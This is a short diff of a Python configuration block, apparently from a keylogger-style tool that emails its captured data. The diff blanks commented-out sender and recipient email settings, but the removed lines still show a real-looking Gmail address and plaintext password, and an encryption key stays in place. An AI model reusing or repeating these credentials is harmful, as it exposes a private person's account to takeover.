@@ -36,9 +36,9 @@ file_merge = file_path + extend
 microphone_time = 10
 key = "uxt1hzWaFwkG9Hd2LxBXIdHo2BdNcmYYX0dOVb-YsY0="
 
-#email_address = "thenazim0707@gmail.com"
-#password = "N@z!m2001"
-#toaddr = "newig31544@julsard.com"  # to mail address
+#email_address = ""
+#password = ""
+#toaddr = ""  # to mail address
 
 #Mail
 """
